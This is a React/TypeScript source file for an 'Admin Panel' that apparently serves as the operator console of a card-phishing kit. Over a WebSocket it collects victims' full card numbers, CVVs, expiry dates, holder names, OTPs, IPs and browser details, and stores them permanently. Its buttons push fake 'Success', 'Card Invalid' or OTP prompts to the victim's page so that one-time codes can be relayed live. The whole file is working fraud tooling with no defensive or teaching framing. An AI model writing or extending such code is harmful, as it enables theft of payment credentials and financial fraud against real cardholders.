
import React, { useState, useEffect } from 'react';

interface CardData {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardHolder: string;
  amount: string;
}

interface UserInfo {
  ip: string;
  browser: string;
  network: string;
}

interface Visitor {
  ip: string;
  timestamp: Date;
}

interface CardSubmission {
  cardData: CardData;
  userInfo: UserInfo;
  timestamp: Date;
}

const AdminPanel = () => {
  const [cardData, setCardData] = useState<CardData | null>(null);
  const [userInfo, setUserInfo] = useState<UserInfo | null>(null);
  const [otp, setOtp] = useState<string>('');
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>([]);
  const [ws, setWs] = useState<WebSocket | null>(null);
  const [showCommands, setShowCommands] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<string>('Connecting...');

  useEffect(() => {
    // Create WebSocket server connection
    // For railway.com, use the appropriate WebSocket URL
    const wsUrl = window.location.hostname === 'localhost' ? 'ws://localhost:8080' : `wss://${window.location.hostname}`;
    
    const websocket = new WebSocket(wsUrl);
    
    websocket.onopen = () => {
      console.log('Admin panel connected to WebSocket');
      setConnectionStatus('Connected');
    };
    
    websocket.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        console.log('Received data in admin panel:', data);
        
        if (data.type === 'cardData') {
          console.log('Processing card data:', data);
          setCardData(data.data);
          setUserInfo(data.userInfo);
          setShowCommands(true); // Show commands when new card data arrives
          
          // Store card submission permanently
          const newSubmission = {
            cardData: data.data,
            userInfo: data.userInfo,
            timestamp: new Date(data.timestamp || new Date())
          };
          setCardSubmissions(prev => [...prev, newSubmission]);
          
        } else if (data.type === 'otp') {
          console.log('Received OTP:', data.otp);
          setOtp(data.otp);
        } else if (data.type === 'newVisitor') {
          console.log('Processing new visitor:', data);
          const newVisitor = {
            ip: data.ip,
            timestamp: new Date(data.timestamp || new Date())
          };
          setVisitors(prev => {
            // Check if visitor already exists to avoid duplicates
            const exists = prev.some(v => v.ip === newVisitor.ip);
            if (!exists) {
              return [...prev, newVisitor];
            }
            return prev;
          });
        }
      } catch (error) {
        console.error('Error parsing WebSocket message:', error);
      }
    };
    
    websocket.onclose = () => {
      console.log('WebSocket connection closed');
      setConnectionStatus('Disconnected');
      // Try to reconnect after 3 seconds
      setTimeout(() => {
        window.location.reload();
      }, 3000);
    };

    websocket.onerror = (error) => {
      console.error('WebSocket error:', error);
      setConnectionStatus('Error');
    };
    
    setWs(websocket);
    
    return () => {
      websocket.close();
    };
  }, []);

  const sendCommand = (command: string) => {
    if (ws && ws.readyState === WebSocket.OPEN) {
      console.log('Sending command:', command);
      ws.send(JSON.stringify({ command }));
    } else {
      console.error('WebSocket not connected');
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <h1 className="text-3xl font-bold mb-8 text-center">Admin Panel</h1>
      
      {/* Connection Status */}
      <div className="mb-4">
        <span className={`px-3 py-1 rounded text-sm ${
          connectionStatus === 'Connected' ? 'bg-green-600' : 
          connectionStatus === 'Connecting...' ? 'bg-yellow-600' : 'bg-red-600'
        }`}>
          WebSocket: {connectionStatus}
        </span>
      </div>
      
      {/* Visitors Section */}
      <div className="mb-8">
        <h2 className="text-xl font-bold mb-4">Live Visitors ({visitors.length})</h2>
        <div className="space-y-2">
          {visitors.length === 0 ? (
            <div className="text-gray-400">No visitors yet...</div>
          ) : (
            visitors.map((visitor, index) => (
              <div key={index} className="bg-red-600 text-white p-2 rounded mb-2 inline-block mr-2">
                New Visitor: {visitor.ip} - {visitor.timestamp.toLocaleTimeString()}
              </div>
            ))
          )}
        </div>
      </div>

      {/* Current Card Data Section with Commands */}
      {cardData && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">Latest Card Information</h2>
          
          {/* User Info */}
          {userInfo && (
            <div className="grid grid-cols-3 gap-4 mb-4">
              <div>
                <span className="font-bold">IP Address:</span> {userInfo.ip}
              </div>
              <div>
                <span className="font-bold">Browser:</span> {userInfo.browser}
              </div>
              <div>
                <span className="font-bold">Network:</span> {userInfo.network}
              </div>
            </div>
          )}
          
          {/* Card Info with Commands */}
          <div className="font-bold text-lg flex items-center justify-between flex-wrap">
            <span className="mr-4">
              {cardData.cardNumber} | {cardData.expiryMonth}/{cardData.expiryYear} | {cardData.cvv} | {cardData.cardHolder} | Amount: ₹{cardData.amount} {otp && `| OTP: ${otp}`}
            </span>
            {showCommands && (
              <div className="flex space-x-2 mt-2">
                <button
                  onClick={() => sendCommand('showotp')}
                  className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Show OTP
                </button>
                <button
                  onClick={() => sendCommand('fail')}
                  className="bg-red-600 hover:bg-red-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Fail
                </button>
                <button
                  onClick={() => sendCommand('success')}
                  className="bg-green-600 hover:bg-green-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Success
                </button>
                <button
                  onClick={() => sendCommand('invalidotp')}
                  className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Invalid OTP
                </button>
                <button
                  onClick={() => sendCommand('cardinvalid')}
                  className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Card Invalid
                </button>
                <button
                  onClick={() => sendCommand('carddisabled')}
                  className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Card Disabled
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      {/* All Card Submissions History */}
      {cardSubmissions.length > 0 && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">All Card Submissions ({cardSubmissions.length})</h2>
          <div className="space-y-3 max-h-64 overflow-y-auto">
            {cardSubmissions.map((submission, index) => (
              <div key={index} className="bg-gray-700 p-3 rounded text-sm">
                <div className="font-bold mb-2">
                  Submission #{cardSubmissions.length - index} - {submission.timestamp.toLocaleString()}
                </div>
                <div className="grid grid-cols-2 gap-2 text-xs">
                  <div>Card: {submission.cardData.cardNumber}</div>
                  <div>Exp: {submission.cardData.expiryMonth}/{submission.cardData.expiryYear}</div>
                  <div>CVV: {submission.cardData.cvv}</div>
                  <div>Holder: {submission.cardData.cardHolder}</div>
                  <div>Amount: ₹{submission.cardData.amount}</div>
                  <div>IP: {submission.userInfo.ip}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Instructions */}
      <div className="bg-gray-800 p-4 rounded">
        <h3 className="text-lg font-bold mb-2">Instructions</h3>
        <ul className="text-sm space-y-1">
          <li>• Wait for card data to appear above</li>
          <li>• Use "Show OTP" to display OTP form to user</li>
          <li>• Use "Success" to complete payment successfully</li>
          <li>• Use "Fail", "Card Invalid", or "Card Disabled" to show error messages</li>
          <li>• Use "Invalid OTP" to reject OTP and ask for re-entry</li>
          <li>• All submissions are saved permanently and will not be deleted</li>
        </ul>
      </div>
    </div>
  );
};

export default AdminPanel;
